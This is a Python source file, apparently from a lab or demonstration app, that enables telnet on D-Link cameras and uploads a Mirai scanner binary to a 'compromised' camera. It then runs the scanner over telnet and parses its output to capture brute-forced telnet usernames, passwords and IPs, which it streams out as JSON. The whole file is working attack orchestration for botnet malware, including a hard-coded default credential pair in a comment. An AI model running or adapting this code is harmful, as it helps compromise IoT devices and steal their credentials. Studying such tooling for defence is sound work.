
import json
import telnetlib
import re
import time


from constants import (USERNAME,PASSWORD,COMPROMISED_HOST,VICTIM_HOST,MIRAI_SCAN_BIN,TELNET_PORT)
from telnet_service import enable_telnet, upload_file_to_dlink_cam

telnet_enabled = False  



def prepare_hosts_for_scanning():


    status_code = enable_telnet(COMPROMISED_HOST)
    if status_code != 200:
        print(f"Failed to enable telnet, make sure host x.x.x.{COMPROMISED_HOST} is up and running")
        exit(1)

    status_code = enable_telnet(VICTIM_HOST)
    if status_code != 200:
        print(f"Failed to enable telnet, make sure host x.x.x.{VICTIM_HOST} is up and running")
        exit(1)

    # else:
    #     print("Telnet already enabled, skipping...")

    status_code = upload_file_to_dlink_cam(COMPROMISED_HOST, MIRAI_SCAN_BIN)
    if status_code != 200:
        print(f"Failed to upload {MIRAI_SCAN_BIN}, make sure host x.x.x.{COMPROMISED_HOST} is up and telnet is enabled!")
        exit(1)

    return 0

def start_scanning_service(endpoint):
    from app import output_queues  

    send = False 

    succes_flag = prepare_hosts_for_scanning()
    if succes_flag == 0:
        # output_queues[endpoint].put(f"Uploaded {MIRAI_SCAN_BIN} to host: .{COMPROMISED_HOST}")
        print(f"Uploaded {MIRAI_SCAN_BIN} to host: .{COMPROMISED_HOST}")
    else:
        # output_queues[endpoint].put(f"Failed to upload {MIRAI_SCAN_BIN} to host: .{COMPROMISED_HOST}")
        print(f"Failed to upload {MIRAI_SCAN_BIN} to host: .{COMPROMISED_HOST}")



    try:
        with telnetlib.Telnet(COMPROMISED_HOST, TELNET_PORT, timeout=10) as tn:
            tn.read_until(b"login: ")
            tn.write(USERNAME.encode('utf-8') + b"\n")
            tn.read_until(b"Password: ")
            tn.write(PASSWORD.encode('utf-8') + b"\n")

            tn.write(b"./mirai-scan.mpsl\n")


            patterns = [
                r"Attempting to brute found IP (\d{1,3}(?:\.\d{1,3}){3})",  # Extract IP from brute attempt
                #r"Found verified working telnet",                         # Match working telnet
                #r"Send scan result to loader",                            # Match scan result
                r"\[scanner\] (FD\d+) connected\. Trying (.*?)\r",        # Match connection attempts
                r"\[scanner\] (FD\d+) Attempting to brute found IP (.*)"   # Match successful brute force results
            ]

            buffer = ""
            scanners = {}

            # Regex patterns
            scanner_pattern = re.compile(r'(\[scanner\].*?)(?=\[scanner\]|\Z)', re.DOTALL)
            brute_pattern = re.compile(r'\[scanner\] (FD\d+) Attempting to brute found IP ([\d\.]+)')
            connect_pattern = re.compile(r'\[scanner\] (FD\d+) connected\. Trying (.+)')
            verified_pattern = re.compile(r'\[scanner\] (FD\d+) Found verified working telnet')
            scan_send = False
            while True:
                output = tn.read_very_eager().decode('utf-8', errors='ignore')
                if output:
                    buffer += output  # Add new data to buffer

                    # Normalize newlines
                    buffer = buffer.replace('\r\n', ' ').replace('\n', ' ')

                    # Process matches from the buffer
                    while True:
                        match = scanner_pattern.search(buffer)
                        if not match:
                            break  # No more complete messages to process
                        full_message = match.group(0).strip()
                        if not send:
                            print(full_message)  # Print the full message
                        buffer = buffer[match.end():]  # Remove processed message from buffer

                        # If scanner is attempting to brute-force an IP
                        brute_match = brute_pattern.search(full_message)
                        if brute_match and not scan_send:
                            fd, ip = brute_match.groups()
                            scanners[fd] = {"ip": ip, "creds": None, "verified": False}
                            msg = f"Scanning: {ip}"
                            if not send:
                                output_queues[endpoint].put(msg)  # Use append to queue messages
                                scan_send = True

                        # If scanner connects and tries credentials
                        connect_match = connect_pattern.search(full_message)
                        if connect_match:
                            fd, creds = connect_match.groups()
                            if fd in scanners and scanners[fd]["creds"] is None:
                                scanners[fd]["creds"] = creds
                                msg = f"Trying to login with creds: {creds}"
                                if not send:
                                    print(msg)
                                    output_queues[endpoint].put(msg)

                        # If scanner successfully verifies telnet
                        verified_match = verified_pattern.search(full_message)
                        if verified_match:
                            fd = verified_match.group(1)
                            if fd in scanners:
                                scanners[fd]["verified"] = True
                                username = scanners[fd]['creds'].split(":")[0]
                                password = scanners[fd]['creds'].split(":")[1].strip()
                                ip = scanners[fd]['ip']
                                # cred = {
                                #     "username": "admin",
                                #     "password": "smcadmin",
                                #     "ip": ip,
                                # }
                                cred = {
                                    "username": username,
                                    "password": password,
                                    "ip": ip,
                                }
                                if not send:
                                    msg = json.dumps(cred)
                                    print(msg)
                                    output_queues[endpoint].put(msg)
                                    send = True
                                #return

                if tn.eof:
                    print(f"Telnet session for {endpoint} closed.")
                    break
                time.sleep(0.1)  # Sleep briefly to avoid busy waiting



    except Exception as e:
        error_message = f"Error during Telnet connection for {endpoint}: {e}"
        print(error_message)
        #output_queues[endpoint].put(error_message)
